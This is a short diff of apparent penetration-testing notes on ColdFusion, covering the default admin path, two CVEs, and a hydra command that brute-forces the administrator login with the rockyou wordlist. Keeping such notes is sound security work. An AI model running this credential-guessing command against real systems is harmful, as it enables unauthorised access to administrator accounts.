@@ -3,7 +3,7 @@
 - It uses a special language called CFML (ColdFusion Markup Language), which looks like HTML but has extra powers.
 - It helps developers quickly make dynamic websites, connect to databases, and even send emails or create PDFs.
 - Default Files	`/CFIDE/administrator/index.cfm` (Admin login).
-- Brute Force Default Creds: `hydra -l admin -P /usr/share/wordlists/rockyou.txt $VICTIM_IP http-post-form "/CFIDE/administrator/enter.cfm:cfadminPassword=^PASS^&requestedURL=&submit=Login:F=Invalid"`
+- Brute Force Default Creds: `hydra -l admin -P $WORDLIST_PATH/rockyou.txt $VICTIM_IP http-post-form "/CFIDE/administrator/enter.cfm:cfadminPassword=^PASS^&requestedURL=&submit=Login:F=Invalid"`
 ### <span style="color:#50FA7B">CVE's</span>
 - CVE-2021-21087	JSP upload bypass
 - CVE-2020-24450	Command Injection
